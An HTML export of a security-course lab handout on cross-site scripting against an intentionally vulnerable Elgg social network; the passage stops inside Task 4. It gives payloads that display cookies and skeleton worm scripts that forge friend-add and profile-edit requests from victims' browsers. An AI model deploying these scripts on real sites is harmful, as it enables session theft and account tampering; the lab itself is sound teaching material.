@@ -1,0 +1,433 @@
+<!DOCTYPE html><html><head>
+      <title>Web_XSS_Elgg</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      
+      <link rel="stylesheet" href="file:////home/seed/.vscode-server/extensions/shd101wyy.markdown-preview-enhanced-0.6.2/node_modules/@shd101wyy/mume/dependencies/katex/katex.min.css">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      <style>
+      /**
+ * prism.js Github theme based on GitHub's theme.
+ * @author Sam Clarke
+ */
+code[class*="language-"],
+pre[class*="language-"] {
+  color: #333;
+  background: none;
+  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  text-align: left;
+  white-space: pre;
+  word-spacing: normal;
+  word-break: normal;
+  word-wrap: normal;
+  line-height: 1.4;
+
+  -moz-tab-size: 8;
+  -o-tab-size: 8;
+  tab-size: 8;
+
+  -webkit-hyphens: none;
+  -moz-hyphens: none;
+  -ms-hyphens: none;
+  hyphens: none;
+}
+
+/* Code blocks */
+pre[class*="language-"] {
+  padding: .8em;
+  overflow: auto;
+  /* border: 1px solid #ddd; */
+  border-radius: 3px;
+  /* background: #fff; */
+  background: #f5f5f5;
+}
+
+/* Inline code */
+:not(pre) > code[class*="language-"] {
+  padding: .1em;
+  border-radius: .3em;
+  white-space: normal;
+  background: #f5f5f5;
+}
+
+.token.comment,
+.token.blockquote {
+  color: #969896;
+}
+
+.token.cdata {
+  color: #183691;
+}
+
+.token.doctype,
+.token.punctuation,
+.token.variable,
+.token.macro.property {
+  color: #333;
+}
+
+.token.operator,
+.token.important,
+.token.keyword,
+.token.rule,
+.token.builtin {
+  color: #a71d5d;
+}
+
+.token.string,
+.token.url,
+.token.regex,
+.token.attr-value {
+  color: #183691;
+}
+
+.token.property,
+.token.number,
+.token.boolean,
+.token.entity,
+.token.atrule,
+.token.constant,
+.token.symbol,
+.token.command,
+.token.code {
+  color: #0086b3;
+}
+
+.token.tag,
+.token.selector,
+.token.prolog {
+  color: #63a35c;
+}
+
+.token.function,
+.token.namespace,
+.token.pseudo-element,
+.token.class,
+.token.class-name,
+.token.pseudo-class,
+.token.id,
+.token.url-reference .token.variable,
+.token.attr-name {
+  color: #795da3;
+}
+
+.token.entity {
+  cursor: help;
+}
+
+.token.title,
+.token.title .token.punctuation {
+  font-weight: bold;
+  color: #1d3e81;
+}
+
+.token.list {
+  color: #ed6a43;
+}
+
+.token.inserted {
+  background-color: #eaffea;
+  color: #55a532;
+}
+
+.token.deleted {
+  background-color: #ffecec;
+  color: #bd2c00;
+}
+
+.token.bold {
+  font-weight: bold;
+}
+
+.token.italic {
+  font-style: italic;
+}
+
+
+/* JSON */
+.language-json .token.property {
+  color: #183691;
+}
+
+.language-markup .token.tag .token.punctuation {
+  color: #333;
+}
+
+/* CSS */
+code.language-css,
+.language-css .token.function {
+  color: #0086b3;
+}
+
+/* YAML */
+.language-yaml .token.atrule {
+  color: #63a35c;
+}
+
+code.language-yaml {
+  color: #183691;
+}
+
+/* Ruby */
+.language-ruby .token.function {
+  color: #333;
+}
+
+/* Markdown */
+.language-markdown .token.url {
+  color: #795da3;
+}
+
+/* Makefile */
+.language-makefile .token.symbol {
+  color: #795da3;
+}
+
+.language-makefile .token.variable {
+  color: #183691;
+}
+
+.language-makefile .token.builtin {
+  color: #0086b3;
+}
+
+/* Bash */
+.language-bash .token.keyword {
+  color: #0086b3;
+}
+
+/* highlight */
+pre[data-line] {
+  position: relative;
+  padding: 1em 0 1em 3em;
+}
+pre[data-line] .line-highlight-wrapper {
+  position: absolute;
+  top: 0;
+  left: 0;
+  background-color: transparent;
+  display: block;
+  width: 100%;
+}
+
+pre[data-line] .line-highlight {
+  position: absolute;
+  left: 0;
+  right: 0;
+  padding: inherit 0;
+  margin-top: 1em;
+  background: hsla(24, 20%, 50%,.08);
+  background: linear-gradient(to right, hsla(24, 20%, 50%,.1) 70%, hsla(24, 20%, 50%,0));
+  pointer-events: none;
+  line-height: inherit;
+  white-space: pre;
+}
+
+pre[data-line] .line-highlight:before, 
+pre[data-line] .line-highlight[data-end]:after {
+  content: attr(data-start);
+  position: absolute;
+  top: .4em;
+  left: .6em;
+  min-width: 1em;
+  padding: 0 .5em;
+  background-color: hsla(24, 20%, 50%,.4);
+  color: hsl(24, 20%, 95%);
+  font: bold 65%/1.5 sans-serif;
+  text-align: center;
+  vertical-align: .3em;
+  border-radius: 999px;
+  text-shadow: none;
+  box-shadow: 0 1px white;
+}
+
+pre[data-line] .line-highlight[data-end]:after {
+  content: attr(data-end);
+  top: auto;
+  bottom: .4em;
+}html body{font-family:"Helvetica Neue",Helvetica,"Segoe UI",Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ul,html body>ol{margin-bottom:16px}html body ul,html body ol{padding-left:2em}html body ul.no-list,html body ol.no-list{padding:0;list-style-type:none}html body ul ul,html body ul ol,html body ol ol,html body ol ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;background-color:#f0f0f0;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:bold;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:bold}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em !important;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::before,html body code::after{letter-spacing:-0.2em;content:"\00a0"}html body pre>code{padding:0;margin:0;font-size:.85em !important;word-break:normal;white-space:pre;background:transparent;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;font-size:.85em !important;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:before,html body pre tt:before,html body pre code:after,html body pre tt:after{content:normal}html body p,html body blockquote,html body ul,html body ol,html body dl,html body pre{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body pre,html body code{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview .pagebreak,.markdown-preview .newpage{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center !important}.markdown-preview:not([for="preview"]) .code-chunk .btn-group{display:none}.markdown-preview:not([for="preview"]) .code-chunk .status{display:none}.markdown-preview:not([for="preview"]) .code-chunk .output-div{margin-bottom:16px}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0}@media screen and (min-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{font-size:14px !important;padding:1em}}@media print{html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,0.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{padding:0 1.6em;margin-top:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc li{margin-bottom:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{list-style-type:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% -  300px);padding:2em calc(50% - 457px -  150px);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
+/* Please visit the URL below for more information: */
+/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */
+
+      </style>
+    </head>
+    <body for="html-export">
+      <div class="mume markdown-preview  ">
+      <h1 class="mume-header" id="cross-site-scripting-xss-attack-lab">Cross-Site Scripting (XSS) Attack Lab</h1>
+
+<p>Please download Labsetup.zip from <a href="https://seedsecuritylabs.org/Labs_20.04/Files/Web_XSS_Elgg/Labsetup.zip">https://seedsecuritylabs.org/Labs_20.04/Files/Web_XSS_Elgg/Labsetup.zip</a></p>
+<h2 class="mume-header" id="overview">Overview</h2>
+
+<p>Cross-site scripting (XSS) is a type of vulnerability commonly found in web applications. This vulnerability makes it possible for attackers to inject malicious code (e.g. JavaScript programs) into victim&apos;s web browser. Using this malicious code, attackers can steal a victim&apos;s credentials, such as session cookies. The access control policies&#xA0;(i.e., the same origin policy) employed by browsers to protect those credentials can be bypassed by exploiting XSS vulnerabilities.</p>
+<p>To demonstrate what attackers can do by exploiting XSS vulnerabilities, we have set up a web application named <code>Elgg</code> in our pre-built Ubuntu VM image. <code>Elgg</code> is a very popular open-source web application for social network, and it has implemented a number of countermeasures to remedy the XSS threat. To demonstrate how XSS attacks work, we have commented out these countermeasures in Elgg in our installation, intentionally making Elgg vulnerable to XSS attacks. Without the countermeasures, users can post any arbitrary message, including JavaScript programs, to the user profiles.</p>
+<p>In this lab, students need to exploit this vulnerability to launch an XSS attack on the modified <code>Elgg</code>, in a way that is similar to what Samy Kamkar did to <code>MySpace</code> in 2005 through the notorious Samy worm. The ultimate goal of this attack is to spread an XSS worm among the users, such that whoever views an infected user profile will be infected, and whoever is infected will add you (i.e., the attacker) to his/her friend list. This lab covers the following topics:</p>
+<ul>
+<li>
+<p>Cross-Site Scripting attack</p>
+</li>
+<li>
+<p>XSS worm and self-propagation</p>
+</li>
+<li>
+<p>Session cookies</p>
+</li>
+<li>
+<p>HTTP GET and POST requests</p>
+</li>
+<li>
+<p>JavaScript and Ajax</p>
+</li>
+<li>
+<p>Content Security Policy (CSP)</p>
+</li>
+</ul>
+<h2 class="mume-header" id="lab-environment-setup">Lab Environment Setup</h2>
+
+<h3 class="mume-header" id="dns-setup">DNS Setup</h3>
+
+<p>We have set up several websites for this lab. They are hosted by the container <code>10.9.0.5</code>. We need to map the names of the web server to this IP address. Please add the following entries to <code>/etc/hosts</code>. You need to use the root privilege to modify this file:</p>
+<pre data-role="codeBlock" data-info="plaintext" class="language-plaintext">10.9.0.5        www.seed-server.com
+</pre><h2 class="mume-header" id="elgg-container">Elgg Container</h2>
+
+<p>We use an open-source web application called <code>Elgg</code> in this lab. <code>Elgg</code> is a web-based social-networking application. It is already set up in the provided container images; its URL is <code>http://www.seed-server.com</code>. We use two containers, one running the web server (<code>10.9.0.5</code>) , and the other running the MySQL database (<code>10.9.0.6</code>). The IP addresses for these two containers are hardcoded in various places in the configuration, so please do not change them from the <code>docker-compose.yml</code> file.</p>
+<h2 class="mume-header" id="lab-tasks">Lab Tasks</h2>
+
+<p>When you copy and paste code, the quotation marks, especially single quote, may turn into a different symbol that looks similar. They will cause errors in the code, so keep that in mind. When that happens, delete them, and manually type those symbols.</p>
+<h3 class="mume-header" id="preparation-getting-familiar-with-the-http-header-live-tool">Preparation: Getting Familiar with the <code>&quot;HTTP Header Live&quot;</code> tool</h3>
+
+<p>In this lab, we need to construct HTTP requests. To figure out what an acceptable HTTP request in Elgg looks like, we need to be able to capture and analyze HTTP requests. We can use a Firefox add-on called <code>&quot;HTTP Header Live&quot;</code> for this purpose. Before you start working on this lab, you should get familiar with this tool.</p>
+<h3 class="mume-header" id="task-1-posting-a-malicious-message-to-display-an-alert-window">Task 1: Posting a Malicious Message to Display an Alert Window</h3>
+
+<p>The objective of this task is to embed a JavaScript program in your <code>Elgg</code> profile, such that when another user views your profile, the JavaScript program will be executed and an alert window will be displayed. The following JavaScript program will display an alert window:</p>
+<pre data-role="codeBlock" data-info="html" class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
+    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&quot;XSS&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</pre><p>If you embed the above JavaScript code in your profile (e.g. in the brief description field), then any user who views your profile will see the alert window.</p>
+<p>In this case, the JavaScript code is short enough to be typed into the short description field. If you want to run a long JavaScript, but you are limited by the number of characters you can type in the form, you can store the JavaScript program in a standalone file, save it with the .js extension, and then refer to it using the <code>src</code> attribute in the <code>&lt;script&gt;</code> tag. See the following example:</p>
+<pre data-role="codeBlock" data-info="html" class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
+    <span class="token comment">// src is used to specifies the URL of an external script file</span>
+    src<span class="token operator">=</span><span class="token string">&quot;http://www.example.com/myscripts.js&quot;</span><span class="token operator">&gt;</span> 
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</pre><p>In the above example, the page will fetch the JavaScript program from <code>http://www.example.com</code>, which can be any web server.</p>
+<h2 class="mume-header" id="task-2-posting-a-malicious-message-to-display-cookies">Task 2: Posting a Malicious Message to Display Cookies</h2>
+
+<p>The objective of this task is to embed a JavaScript program in your <code>Elgg</code> profile, such that when another user views your profile, the user&apos;s cookies will be displayed in the alert window. This can be done by adding some additional code to the JavaScript program in the previous task:</p>
+<pre data-role="codeBlock" data-info="html" class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword keyword-var">var</span> cookie <span class="token operator">=</span> <span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token property-access">cookie</span><span class="token punctuation">;</span>
+    <span class="token function">alert</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</pre><h2 class="mume-header" id="task-3-becoming-the-victims-friend">Task 3: Becoming the Victim&apos;s Friend</h2>
+
+<p>In this and next task, we will perform an attack similar to what Samy did to MySpace in 2005 (i.e. the Samy Worm). We will write an XSS worm that adds Samy as a friend to any other user that visits Samy&apos;s page. This worm does not self-propagate; in task 5, we will make it self-propagating.</p>
+<p>In this task, we need to write a malicious JavaScript program that forges HTTP requests directly from the victim&apos;s browser, without the intervention of the attacker. The objective of the attack is to add Samy as a friend to the victim. We have already created a user called Samy on the <code>Elgg</code> server (the user name is <code>samy</code>).</p>
+<p>To add a friend for the victim, we should first find out how a legitimate user adds a friend in <code>Elgg</code>. More specifically, we need to figure out what are sent to the server when a user adds a friend. Firefox&apos;s <code>HTTP Header Live</code> inspection tool can help us get the information. It can display the contents of any HTTP request message sent from the browser. From the contents, we can identify all the parameters in the request. Once we understand what the add-friend HTTP request look like, we can write a JavaScript program to send out the same HTTP request. We provide a skeleton JavaScript code that aids in completing the task.</p>
+<pre data-role="codeBlock" data-info="html" class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
+    <span class="token dom variable">window</span><span class="token punctuation">.</span><span class="token method-variable function-variable method function property-access">onload</span> <span class="token operator">=</span> <span class="token keyword keyword-function">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token comment">// Set the timestamp and secret token parameters</span>
+        <span class="token keyword keyword-var">var</span> ts<span class="token operator">=</span><span class="token string">&quot;&amp;__elgg_ts=&quot;</span><span class="token operator">+</span>elgg<span class="token punctuation">.</span><span class="token property-access">security</span><span class="token punctuation">.</span><span class="token property-access">token</span><span class="token punctuation">.</span><span class="token property-access">__elgg_ts</span><span class="token punctuation">;</span>
+        <span class="token keyword keyword-var">var</span> token<span class="token operator">=</span><span class="token string">&quot;&amp;__elgg_token=&quot;</span><span class="token operator">+</span>elgg<span class="token punctuation">.</span><span class="token property-access">security</span><span class="token punctuation">.</span><span class="token property-access">token</span><span class="token punctuation">.</span><span class="token property-access">__elgg_token</span><span class="token punctuation">;</span>
+
+        <span class="token comment">//Construct the HTTP request to add Samy as a friend.</span>
+        <span class="token keyword keyword-var">var</span> attackerGuid<span class="token operator">=</span><span class="token spread operator">...</span><span class="token punctuation">;</span>   <span class="token comment">//FILL IN</span>
+        <span class="token keyword keyword-var">var</span> sendurl<span class="token operator">=</span><span class="token spread operator">...</span><span class="token punctuation">;</span>    <span class="token comment">//FILL IN</span>
+
+        <span class="token comment">//Create and send Ajax request to modify profile</span>
+        <span class="token keyword control-flow keyword-if">if</span><span class="token punctuation">(</span>elgg<span class="token punctuation">.</span><span class="token property-access">session</span><span class="token punctuation">.</span><span class="token property-access">user</span><span class="token punctuation">.</span><span class="token property-access">guid</span><span class="token operator">!=</span>attackerGuid<span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword keyword-var">var</span> <span class="token maybe-class-name">Ajax</span><span class="token operator">=</span><span class="token keyword keyword-new">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token maybe-class-name">Ajax</span><span class="token punctuation">.</span><span class="token method function property-access">open</span><span class="token punctuation">(</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span> sendurl<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token maybe-class-name">Ajax</span><span class="token punctuation">.</span><span class="token method function property-access">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Host&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;www.seed-server.com&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token maybe-class-name">Ajax</span><span class="token punctuation">.</span><span class="token method function property-access">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;application/x-www-form-urlencoded&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token maybe-class-name">Ajax</span><span class="token punctuation">.</span><span class="token method function property-access">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</pre><p>Refer to <a href="https://www.w3schools.com/js/js_ajax_intro.asp">Asynchronous JavaScript And XML</a> (AJAX) for usage of AJAX. AJAX allows web pages to be updated asynchronously by exchanging data with a web server behind the scenes. This means that it is possible to update parts of a web page, without reloading the whole page.</p>
+<p>The above code should be placed in the <code>&quot;About Me&quot;</code> field of Samy&apos;s profile page. This field provides two editing modes: Editor mode (default) and Text mode. The Editor mode adds extra HTML code to the text typed into the field, while the Text mode does not. Since we do not want any extra code added to our attacking code, the Text mode should be enabled before entering the above JavaScript code. This can be done by clicking on <code>&quot;Edit HTML&quot;</code>, which can be found at the top right of the <code>&quot;About Me&quot;</code> text field.</p>
+<p><strong>Question.</strong> If the <code>Elgg</code> application only provide the Editor mode for the <code>&quot;About Me&quot;</code> field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?</p>
+<h2 class="mume-header" id="task-4-modifying-the-victims-profile">Task 4: Modifying the Victim&apos;s Profile</h2>
+
+<p>The objective of this task is to modify the victim&apos;s profile when the victim visits Samy&apos;s page. Specifically, modify the victim&apos;s <code>&quot;About Me&quot;</code> field. We will write an XSS worm to complete the task. This worm does not self-propagate; in task 5, we will make it self-propagating.</p>
+<p>Similar to the previous task, we need to write a malicious JavaScript program that forges HTTP requests directly from the victim&apos;s browser, without the intervention of the attacker. To modify profile, we should first find out how a legitimate user edits or modifies his/her profile in <code>Elgg</code>. More specifically, we need to figure out how the HTTP POST request is constructed to modify a user&apos;s profile. We will use Firefox&apos;s <code>HTTP Header Live</code> inspection tool. Once we understand how the modify-profile HTTP POST request looks like, we can write a JavaScript program to send out the same HTTP request. We provide a skeleton JavaScript code that aids in completing the task.</p>
+<pre data-role="codeBlock" data-info="html" class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
+    <span class="token dom variable">window</span><span class="token punctuation">.</span><span class="token method-variable function-variable method function property-access">onload</span> <span class="token operator">=</span> <span class="token keyword keyword-function">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token comment">//JavaScript code to access user name, user guid, Time Stamp __elgg_ts and Security Token __elgg_token</span>
+        <span class="token keyword keyword-var">var</span> userName<span class="token operator">=</span><span class="token string">&quot;&amp;name=&quot;</span><span class="token operator">+</span>elgg<span class="token punctuation">.</span><span class="token property-access">session</span><span class="token punctuation">.</span><span class="token property-access">user</span><span class="token punctuation">.</span><span class="token property-access">name</span><span class="token punctuation">;</span>
+        <span class="token keyword keyword-var">var</span> guid<span class="token operator">=</span><span class="token string">&quot;&amp;guid=&quot;</span><span class="token operator">+</span>elgg<span class="token punctuation">.</span><span class="token property-access">session</span><span class="token punctuation">.</span><span class="token property-access">user</span><span class="token punctuation">.</span><span class="token property-access">guid</span><span class="token punctuation">;</span>
+        <span class="token keyword keyword-var">var</span> ts<span class="token operator">=</span><span class="token string">&quot;&amp;__elgg_ts=&quot;</span><span class="token operator">+</span>elgg<span class="token punctuation">.</span><span class="token property-access">security</span><span class="token punctuation">.</span><span class="token property-access">token</span><span class="token punctuation">.</span><span class="token property-access">__elgg_ts</span><span class="token punctuation">;</span>
+        <span class="token keyword keyword-var">var</span> token<span class="token operator">=</span><span class="token string">&quot;&amp;__elgg_token=&quot;</span><span class="token operator">+</span>elgg<span class="token punctuation">.</span><span class="token property-access">security</span><span class="token punctuation">.</span><span class="token property-access">token</span><span class="token punctuation">.</span><span class="token property-access">__elgg_token</span><span class="token punctuation">;</span>
+
+        <span class="token comment">//Construct the content of your url.</span>
+        <span class="token keyword keyword-var">var</span> attackerGuid<span class="token operator">=</span><span class="token spread operator">...</span><span class="token punctuation">;</span>   <span class="token comment">//FILL IN</span>
+        <span class="token keyword keyword-var">var</span> sendurl<span class="token operator">=</span><span class="token spread operator">...</span><span class="token punctuation">;</span>    <span class="token comment">//FILL IN</span>
+        <span class="token keyword keyword-var">var</span> content<span class="token operator">=</span><span class="token spread operator">...</span><span class="token punctuation">;</span>    <span class="token comment">//FILL IN</span>
+
+        <span class="token comment">//Create and send Ajax request to modify profile</span>
+        <span class="token keyword control-flow keyword-if">if</span><span class="token punctuation">(</span>elgg<span class="token punctuation">.</span><span class="token property-access">session</span><span class="token punctuation">.</span><span class="token property-access">user</span><span class="token punctuation">.</span><span class="token property-access">guid</span><span class="token operator">!=</span>attackerGuid<span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword keyword-var">var</span> <span class="token maybe-class-name">Ajax</span><span class="token operator">=</span><span class="token keyword keyword-new">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token maybe-class-name">Ajax</span><span class="token punctuation">.</span><span class="token method function property-access">open</span><span class="token punctuation">(</span><span class="token string">&quot;POST&quot;</span><span class="token punctuation">,</span> sendurl<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token maybe-class-name">Ajax</span><span class="token punctuation">.</span><span class="token method function property-access">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Host&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;www.seed-server.com&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token maybe-class-name">Ajax</span><span class="token punctuation">.</span><span class="token method function property-access">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;application/x-www-form-urlencoded&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token maybe-class-name">Ajax</span><span class="token punctuation">.</span><span class="token method function property-access">send</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
